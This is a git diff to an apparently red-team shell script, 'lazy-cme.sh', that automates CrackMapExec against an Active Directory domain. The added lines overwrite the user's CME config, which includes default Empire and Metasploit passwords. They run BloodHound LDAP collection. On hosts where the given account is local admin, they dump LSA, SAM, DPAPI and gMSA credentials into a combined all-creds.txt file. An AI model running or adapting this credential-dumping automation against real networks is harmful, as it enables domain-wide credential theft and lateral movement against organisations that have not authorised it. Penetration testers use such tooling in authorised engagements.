@@ -18,6 +18,8 @@ echo ' '
 echo ' ' 
 echo ' '
 
+
+
 #usage : lazy-cme.sh user password dc-ip domain in-scope-ips-list
 
 #check for args
@@ -27,6 +29,12 @@ echo ' '
 	fi
 
 LOGFILE=$1-lazycme.log
+#this might not be needed, going to leave it until all CME installs are ready
+
+#move config file to .bak; put new config with logging
+mv ~/.cme/cme.conf ~/.cme/cme.conf.bak
+printf '%s\n' '[CME]' 'workspace = default' 'last_used_db = smb' 'pwn3d_label = Pwn3d!' 'audit_mode =' 'log_mode = True' '' '[BloodHound]' 'bh_enabled = False' 'bh_uri = 127.0.0.1' 'bh_port = 7687' 'bh_user = neo4j' 'bh_pass = neo4j' '' '[Empire]' 'api_host = 127.0.0.1' 'api_port = 1337' 'username = empireadmin' 'password = Password123!' '' '[Metasploit]' 'rpc_host = 127.0.0.1' 'rpc_port = 55552' 'password = abc123' > ~/.cme/cme.conf
+sleep 5
 
 #starting up
 date >> $LOGFILE
@@ -126,6 +134,29 @@ echo ' '
 echo ' '
 echo ' '
 echo ' '
+
+###############################################################################
+#BLOODHOUND
+###############################################################################
+
+date >> $LOGFILE
+echo 'Grabbing Blodhound numnums: crackmapexec ldap '$5' -d '$4' -u '$1' -p '$2' --bloodhound --ns '$3' --collection All '
+crackmapexec ldap $5 -d $4 -u $1 -p $2 --bloodhound --ns $3 --collection All | tee -a bloodhound.txt >> $LOGFILE
+
+echo 'make sure to grab the zip from the file provided above!'
+echo 'If this failed, check the name server and run: crackmapexec ldap '$5' -d '$4' -u '$1' -p '$2' --bloodhound --ns <nameserver> --collection All'
+
+
+echo ' '
+echo ' '
+echo ' '
+echo ' '
+echo ' Continuing after 5 seconds -- go dump that zip into bloodhound dude'
+echo ' '
+echo ' '
+echo ' '
+echo ' '
+sleep 5
 
 ###############################################################################
 ###############################################################################
@@ -401,11 +432,15 @@ done
 
 	if cat $1-local-admin.txt | grep -i 'pwn'; then 
 		pwn_hosts=$(cat $1-local-admin.txt | grep -i 'pwn' | cut -d ' ' -f 10)
-		echo 'Founds some local admins... dumping LSA and SAM'
+		echo 'Founds some local admins... dumping creds (lsa, sam, dpapi, gmsa)'
 		date >> $LOGFILE
 		echo 'DUMPING LSA AND SAM' >> $LOGFILE
-		crackmapexec smb $pwn_hosts -d $4 -u $1 -p $2 --lsa | tee LSA-SAM.txt | tee -a $LOGFILE
-		crackmapexec smb $pwn_hosts -d $4 -u $1 -p $2 --sam | tee -a LSA-SAM.txt | tee -a $LOGFILE 
+		crackmapexec smb $pwn_hosts -d $4 -u $1 -p $2 --lsa | tee lsa.txt | tee -a $LOGFILE
+		crackmapexec smb $pwn_hosts -d $4 -u $1 -p $2 --sam | tee -a sam.txt | tee -a $LOGFILE 
+  		crackmapexec smb $pwn_hosts -d $4 -u $1 -p $2 --dpapi | tee -a dpapi.txt | tee -a $LOGFILE
+    		crackmapexec ldap $pwn_hosts -d $4 -u $1 -p $2 --gmsa | tee -a gmsa.txt | tee -a $LOGFILE
+
+      		cat lsa.txt sam.txt dpapi.txt gmsa.txt > all-creds.txt
 	else
 		echo 'No local admins, might check --local-auth' | tee -a $LOGFILE
 	fi
@@ -424,6 +459,9 @@ echo ' '
 echo ' Cleaning up master log file'
 cat $LOGFILE | grep -vi 'esc' > cleaned-$LOGFILE
 ###############################################################################
+
+
+
 
 ###############################################################################
 ###############################################################################
